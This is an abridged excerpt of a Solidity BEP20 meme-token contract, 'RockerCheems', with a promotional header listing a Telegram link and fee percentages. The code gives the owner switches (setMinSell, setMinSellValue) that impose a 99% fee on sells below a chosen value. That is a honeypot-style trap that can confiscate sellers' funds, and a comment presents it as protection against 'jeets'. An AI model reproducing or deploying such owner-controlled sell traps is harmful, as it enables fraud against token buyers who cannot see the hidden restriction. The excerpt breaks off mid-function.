...
Meet the Rocker cousin of Cheems: RockerCheens

TG: https://t.me/RockerCheems

3 % Rewards in Cheems Inu
5 % Market
3 % LP/Buyback
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWRD = IBEP20(0xdFE6891ce8E5a5c7Cf54fFdE406A6C2C54145F71);
    IDEXRouter router;
...
contract RockerCheems is IBEP20, Ownable {

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "RockerCheems";
    string constant _symbol = "$RCheems";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 1 * 10**9 * 10**_decimals;

    uint256 public _maxTxAmount = (_totalSupply/1000)*(20);
    uint256 public _maxWalletToken = (_totalSupply/1000)*(20);
    ...
    //No chart dumps from jeets
    uint256 public minSell = 0;
    bool public useMinSell = false;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        if (useMinSell && isSell){
            if (this.getTokenPrice(amount)<minSell){
                feeAmount = (amount/100)*99;
            }
        }
    ...
    function swapBack() internal swapping {
        ...
        (tmpSuccess,) = payable(buyBackReceiver).call{value: amountBNBMarketing, gas: 30000}("");
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _buyBackFee, uint256 _burnFee, uint256 _buyFee, uint256 _sellFee, uint256 _feeDenominator) external onlyOwner {
        ...
        require(buyFee < feeDenominator/3, "Fees cannot be more than 33%");
    ...
    function setMinSell(bool _useMinSell) external onlyOwner {
        useMinSell = _useMinSell;
    }

    function setMinSellValue(uint256 _minSell) external onlyOwner {
